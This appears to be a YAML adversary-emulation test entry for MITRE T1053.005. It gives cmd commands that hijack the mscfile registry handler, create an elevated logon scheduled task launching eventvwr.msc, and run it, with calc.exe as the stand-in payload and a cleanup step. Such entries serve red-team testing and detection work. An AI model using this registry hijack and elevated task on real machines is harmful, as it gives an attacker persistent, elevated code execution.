- requirements: []
  name: Soumaia ART Tests - Scheduled Task Persistence via Eventviewer.msc
  description: 'Adds persistence by abusing `eventviewer.msc` via a scheduled task.

    When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). (requires elevation)'
  tactic: privilege-escalation
  technique_id: T1053.005
  technique_name: 'Scheduled Task/Job: Scheduled Task'
  executors:
  - cleanup:
    - reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f & schtasks /Delete /TN "EventViewerBypass" /F
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f & schtasks /Create /TN "EventViewerBypass" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN "EventViewerBypass"
  id: a4045395-d0d0-59c5-8954-53e584a6dd53
